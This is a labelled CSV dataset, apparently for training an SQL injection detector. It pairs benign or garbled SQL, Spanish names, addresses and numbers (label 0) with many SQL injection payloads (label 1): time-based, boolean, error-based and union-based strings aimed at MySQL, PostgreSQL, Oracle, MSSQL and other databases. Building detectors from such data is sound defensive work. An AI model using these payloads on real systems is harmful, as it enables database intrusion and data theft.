Query,Label
torrecilla lafuente,0
SELECT AVG ( rain ) FROM found,0
69663934q,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   ""vcvb"" like ""vcvb",1
"  SELECT anyID AS ID, famous AS image FROM service",0
5718,0
"  SELECT information,characteristic,ask FROM door LEFT JOIN Orders ON screen.liftID =  car.angry ORDER BY buried.got",0
SELECT Count ( * )  AS favorite,0
SELECT COUNT ( * )  FROM wp_options WHERE option_name LIKE 'wp\\_wps\\_bg\\_file\\_sync\\_1\\_batch\\_%',0
SELECT AVG ( gentle ) FROM continued SELECT SUM ( cry ) ,0
SELECT * FROM breeze WHERE find BETWEEN drop09/01/1996blind AND dish15/31/1996rabbit,0
SELECT anywhere ( s )  FROM fighting SELECT string FROM political,0
18726543n,0
1' in boolean mode  )   order by 1#,1
"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",1
1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,1
"-5211""   )    )    as bkvr where 4082  =  4082 or 2323  =  8052",1
SELECT * FROM thee 3 SELECT * FROM molecular,0
"INSERT INTO vote ( flat, trap, card, score, correctly, law )  VALUES  ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )  ",0
SELECT COUNT ( wooden )  FROM church,0
-3378'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'otbq'  =  'otbq,1
"-6928""   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   ""mxhr"" like ""mxhr",1
"1'   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'ykxz'  =  'ykxz",1
SELECT TOP 50 PERCENT * FROM instance,0
"1  )   where 8671  =  8671 and make_set  (  4931  =  1642,1642  )  --",1
biosca,0
1 where 6518  =  6518,1
angeles jarama,0
SELECT AVG ( plane )  FROM weather  SELECT SUM ( life ) ,0
5.861E+15,0
"   SELECT chapter,anything,which,airplane,main     (  (  orbit JOIN ran ON sister.purple =  first.friendly )   INNER JOIN heldON Orders.so =  process.anyID ) ",0
SELECT * FROM task FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM house,0
rabascall,0
"1  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
1'||  (  select 'mosp' where 6085  =  6085,1
-6865  )   or   (  8459  =  8459  )  *4906 and   (  6107  =  6107,1
c/ javea 57,0
9665,0
"1'||  (  select 'svgd' from dual where 5188  =  5188 union all select null,null,null,null,null#",1
"select * from generate_series  (  9434,9434,case when   (  9434  =  3991  )   then 1 else 0 end  )   limit 1--",1
SELECT TOP 50 PERCENT * FROM necessary,0
"c/ bascuana 52, 5-e",0
1'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
-2364' or 6743  =  7578,1
17489,0
1'   )    )    as qqvk where 1007  =  1007,1
monteon pasquina,0
3549,0
"1' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and 'zetf'  =  'zetf",1
select   (  case when   (  4666  =  4666  )   then 1 else 4666*  (  select 4666 from master..sysdatabases  )   end  )  --,1
"SELECT DAYNAME ( ""2017-06-15 09:34:21"" ) ;",0
"  UPDATE mental SET win =  'cake', City =  'afternoon' WHERE me =  pull",0
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",1
bruscamente,0
select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,1
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null--",1
SELECT * FROM greatly WHERE feel = 'park' FETCH FIRST 3 ROWS ONLY,0
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0
c7o5ologa,0
"1%""  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT leaf ( s )  FROM to UNION,0
"1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
1'   )    )     )   union all select null--,1
SELECT * FROM Customers ORDER BY CustomerName ASC;,0
"  SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )  ",0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",1
-8234'   )    )     )   or 9323  =  9323#,1
SELECT * FROM birds 3,0
SELECT * FROM everyone FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM both,0
SELECT * FROM hung WHERE easily NOT LIKE '[bill]%',0
SELECT * FROM  ( SELECT drove FROM slope ) ,0
"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",1
06363808f,0
SELECT * FROM arrange WHERE    NOT surprise = 'company',0
ponsati puratic,0
torremocha del campo,0
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5 2:10:5.000003"" ) ;",0
1%'   )    )    union all select null--,1
select * from users where id  =  1 <@1$ or 1  =  1 -- 1,1
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%""  =  """,1
"1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
SELECT open ( s )  FROM color UNION ALL,0
c742na79,0
SELECT * FROM area,0
56876281h,0
"-8614'  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual#",1
SELECT * FROM itself WHERE experience NOT BETWEEN 'sound' AND 'measure',0
SELECT * FROM giving WHERE car NOT LIKE '[ran]%',0
4170,0
select sleep  (  5  )   and 'hhrw' like 'hhrw,1
3.57286E+15,0
SELECT * FROM creature WHERE movement NOT LIKE '[taste]%',0
"  SELECT practiceID AS ID, key AS across FROM camp",0
-6912' in boolean mode  )   union all select 6012--,1
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1
-4979'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'ofgg'  =  'ofgg,1
SELECT ring FROM adult,0
7.90589E+15,0
SELECT * FROM camp ORDER BY ants,0
DELETE FROM seems WHERE cream = 'production',0
1'||  (  select 'flbv' where 7451  =  7451 and 4595  =  4595#,1
"INSERT INTO attack ( fierce, manufacturing, tree, settlers, built, magnet )  VALUES  ( 'condition', 'journey'. difficult', 'gather', 'equator', 'shade', 'giant' )  ",0
"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",1
"1' in boolean mode  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1
ulldecona,0
oliveira,0
SELECT AVG ( official ) FROM body,0
55585768n,0
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_link' LIMIT 1,0
45110,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c87dd67714' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
777t1c4rio,0
atrazar,0
marylin,0
"faus 195,",0
SELECT TOP 3 * FROM doubt SELECT * FROM now 3SELECT * FROM chamber,0
DELETE FROM gave WHERE electric = 'between',0
SELECT * FROM mean WHERE gentle BETWEEN 'thy' AND 'green',0
6180,0
FROM  ( SELECT DISTINCT return FROM call ) ,0
maestro vitoria 10,0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1
or sleep  (  __TIME__  )    =  ',1
"1  )   as idvt where 3490  =  3490 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
SELECT * FROM least 3 SELECT * FROM love,0
29850288z,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'gfln'  =  'gfln",1
"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""zxks""  =  ""zxks",1
8.85119E+15,0
"   SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID ) ",0
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ) ,0
SELECT TOP 50 PERCENT * FROM pure,0
1  )   as zmxb where 8424  =  8424 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1%""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
" select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",1
lizalde-kikabidze@sorority.zr,0
madan deluca,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT AVG ( western ) FROM main SELECT SUM ( orange ) ,0
valdelagua del cerro,0
"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",1
SELECT * FROM energy WHERE alive = 'arm'  OR cross = 'track',0
1  )   where 2083  =  2083,1
SELECT * FROM else WHERE dish BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT main,0
narros de matalayegua,0
"  UPDATE kitchen SET product =  'wait', City =  'favorite' WHERE bat =  everything",0
v433g3o5i6r79,0
SELECT TOP 50 PERCENT * FROM realize,0
"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",1
SELECT MIN ( importance )  AS health FROM log,0
SELECT * FROM handsome FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM over,0
lafferty,0
blotta azagra,0
SELECT * FROM column WHERE captain NOT BETWEEN 'dear' AND 'variety',0
SELECT * FROM support WHERE race = 'needle'  OR important = 'produce',0
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,1
46824,0
SELECT * FROM shall WHERE feel BETWEEN 'phrase' AND 'hope',0
-5258  )   or   (  8459  =  8459  )  *4906,1
15317,0
SELECT * FROM difference 3 SELECT * FROM snow,0
SELECT * FROM shot  WHERE break NOT LIKE '[plenty]%',0
SELECT * FROM birthday WHERE all = 'party' LIMIT 3,0
"plaa dels bous, 107",0
empentar,0
"   SELECT COUNT ( ran ) , monkey FROM operation BY cast",0
SELECT * FROM amount WHERE    NOT factory = 'school',0
1 where 4787  =  4787,1
SELECT * FROM upward WHERE pale = 'structure' FETCH FIRST 3 ROWS ONLY,0
striebeck.magnuson@alpesfranceses.com.im,0
waitfor delay '0:0:5'  )  +',1
estiradamente,0
barcario,0
"com/?option  =  com_k2  <act>  <![CDATA[procMemberInsert]]>  </act>   <act>  <![CDATA[procMemberLogin]]>  </act>   <allow_comment>  <![CDATA[]]>  </allow_comment>   <allow_trackback>  <![CDATA[]]>  </allow_trackback>   <birthday>  <![CDATA[19850616]]>  </birthday>   <content>  <![CDATA[ <img src  =  ""http://media2",0
SELECT COUNT ( out ) FROM port,0
"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",1
"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and 'fsvr'  =  'fsvr",1
SELECT COUNT ( cloud ) FROM child,0
SELECT Count ( * )  AS thing,0
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'acly' like 'acly",1
SELECT * FROM  ( SELECT clock FROM chest ) ,0
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,1
SELECT * FROM completely FETCH FIRST 3 ROWS ONLY,0
"1'  )   as taay where 7027  =  7027 and elt  (  4249  =  4249,7259  )  --",1
1 where 6827  =  6827,1
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0
64446970g,0
50645313a,0
"  SELECT ranchID AS ID, his AS how FROM syllable",0
philipa,0
youji,0
21840329n,0
SELECT * FROM club WHERE with  BETWEEN 10 AND 20,0
1230,0
SELECT TOP 3 * FROM sold WHERE coast = 'must',0
SELECT TOP 3 * FROM paint WHERE change = 'metal',0
"1""  )   as hoiv where 9708  =  9708 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
SELECT * FROM lost,0
SELECT * FROM floating WHERE floating = 'himself' FETCH FIRST 3 ROWS ONLY,0
2308,0
SELECT * FROM label WHERE fox = 'else'  OR five = 'pleasure',0
wong@hiperespaa.ly,0
DELETE FROM take,0
"c/ violetas 43, 3-a",0
SELECT MIN ( symbol )  AS while FROM hurried,0
"  SELECT heartID AS ID, dawn AS behavior FROM opposite",0
"1'||  (  select 'wtdz' from dual where 1866  =  1866 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",1
"  SELECT add,putting,frame FROM clean LEFT JOIN Orders ON recently.courseID =  cage.thirty ORDER BY planet.though",0
"1' in boolean mode  )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
"1""  )   rlike   (  select   (  case when   (  8732  =  6244  )   then 1 else 0x28 end   )    )    and   (  ""unuk""  =  ""unuk",1
46842,0
"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 262310,262326,262328 ) ",0
2161,0
gamal,0
39500,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
SELECT MIN ( move )  AS such FROM construction,0
estalell,0
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
SELECT AVG ( game ) FROM stage SELECT SUM ( subject ) ,0
"  SELECT rock,pretty FROM fruit WHERE country = 'stared' UNION SELECT naturally, most FROM least",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 13506 )  ORDER BY meta_id ASC",0
SELECT * FROM buffalo WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM  ( SELECT golden FROM best ) ,0
"   SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID ) ",0
consalve,0
"  UPDATE direct SET classroom =  'nature', City =  'base' WHERE graph =  mysterious",0
"   SELECT suddenly,bring,distance,hello,addition     (  (  which JOIN lungs ON carried.parent =  shake.curious )   INNER JOIN hadON Orders.baseball =  dirt.moodID ) ",0
-8447 where 2850  =  2850 or 7147  =  3262,1
"1'||  (  select 'uqbj' from dual where 6736  =  6736 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
42156,0
"-9837"" where 7201  =  7201 union all select 7201,7201,7201--",1
SELECT AVG ( practical ) FROM brother SELECT SUM ( yes ) ,0
SELECT * FROM pay WHERE powder = 'manner'  OR pilot = 'saddle',0
SELECT AVG ( Price ) FROM movie,0
SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0
"1'  )   where 8125  =  8125 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT TOP 50 PERCENT * FROM flight SELECT * FROM notice FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wild,0
"-3090"" or make_set  (  9354  =  9354,7185  )   and ""qowe"" like ""qowe",1
47609,0
toolbox,0
SELECT * FROM bottom,0
"1'  )   as sjmt where 6541  =  6541 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"1 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
4az,0
raqu$9omo,0
SELECT * FROM cost 3 SELECT * FROM nor,0
SELECT * FROM evidence WHERE square  BETWEEN 10 AND 20,0
cos6rio,0
4661,0
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%',0
"   SELECT COUNT ( minute ) , office FROM mass BY alive",0
SELECT COUNT ( sent )  FROM closely,0
marice,0
tuffo,0
matney,0
48128,0
SELECT CURRENT_DATE (  ) ;,0
SELECT not ( s )  FROM felt SELECT hollow ( s ) ,0
bablica,0
47319,0
mata hita,0
"1%"" or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
-3431%'  )   or 9323  =  9323#,1
SELECT soldier ( s )  FROM pitch FULL OUTER JOIN,0
warriner,0
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
"SELECT LENGTH ( ""SQL Tutorial"" )  AS LengthOfString;",0
-2992'   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'tjgt'  =  'tjgt,1
"  SELECT * FROM twice WHERE lost NOT IN  ( 'bit', 'typical', 'darkness' )  ",0
SELECT * FROM voyage WHERE social NOT BETWEEN 'fear' AND 'personal',0
c/ maria zayas de sotomayor 18,0
6087,0
roger,0
SELECT * FROM addition FETCH FIRST 3 ROWS ONLY,0
SELECT DISTINCT plan FROM afternoon,0
"select sleep  (  5  )   and    (    (     (  ""%""  =  """,1
"1%'   )    )     (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (   '%'  =  '",1
SELECT AVG ( temperature ) FROM available SELECT SUM ( stretch ) ,0
"  SELECT * FROM any WHERE new IN  ( 'wait', 'lion', 'planet' )  ",0
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0
"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1
"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",1
SELECT * FROM arm WHERE choose LIKE '%follow%',0
tarragona,0
"-3737%"" union all select 4452,4452,4452#",1
48707568p,0
5.05975E+14,0
SELECT MIN ( honor )  AS flight FROM mad,0
"1'   )    )    as eleh where 1347  =  1347 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
 UPDATE Customers SET ContactName = 'Juan'WHERE Country = 'Mexico';,0
matacandelas,0
 UPDATE saw SET clay = 'perhaps'WHERE second = 'plenty',0
"  SELECT complete AS middle, welcome AS [consist]  FROM terrible",0
" SELECT * FROM promised ORDER BY there, bet",0
SELECT moving ( s FROM none RIGHT JOIN,0
SELECT MIN ( happily )  AS exactly FROM blew,0
SELECT * FROM consonant WHERE using LIKE '%book%',0
"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",1
SELECT COUNT ( son ) FROM remarkable,0
"   SELECT point, man, pinkFROM jungle WHERE canal  IS NOT NULL",0
45591,0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'owwf'  =  'owwf",1
1'||  (  select 'xugb' from dual where 6772  =  6772,1
"1   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT * FROM completely WHERE naturally = 'zoo',0
SELECT * FROM itself WHERE century BETWEEN dirty09/01/1996more AND load15/31/1996case,0
SELECT AVG ( alone ) FROM sea,0
"1""   )    )    as fapw where 4722  =  4722 union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT compound,0
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe",1
SELECT * FROM pink WHERE having NOT BETWEEN 'nervous' AND 'maybe',0
"   SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID ) ",0
"1%""   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
" SELECT * FROM being ORDER BY said ASC, coal DESC",0
"  SELECT * FROM young WHERE happily NOT IN  ( 'flower', 'whose', 'within' )  ",0
SELECT * FROM roar ORDER BY represent,0
1'  )   waitfor delay '0:0:5' and   (  'peyv' like 'peyv,1
robieux,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""layz""  =  ""layz",1
par4u8i67t3,0
"1""  )   as uyms where 6210  =  6210 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"  SELECT foodID AS ID, those AS distant FROM deer",0
gregescos,0
SELECT daily ( s )  FROM shorter LEFT JOIN,0
"1%"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"elt  (  5953  =  5953,1  )  ",1
if  (  9953  =  4347  )   select 9953 else drop function ocau--,1
"c/ gaspar reyes, 172 8?f",0
"1""   )    )    union all select null,null,null,null--",1
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20,0
SELECT strike,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5# pdyo",1
-9711'+  (  select 'ckpj' where 8338  =  8338 union all select 8338--,1
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   -- sbvl",1
SELECT COUNT ( tobacco )  FROM behind,0
SELECT * FROM whatever WHERE lesson = 'temperature'  AND  ( tried = 'fighting' OR chapter = 'good' ) ,0
1'||  (  select 'jjpy' from dual where 6295  =  6295,1
"  SELECT * FROM willing WHERE copper IN  ( 'control', 'furniture', 'solution' )  ",0
"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish )  VALUES  ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )  ",0
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
63545647m,0
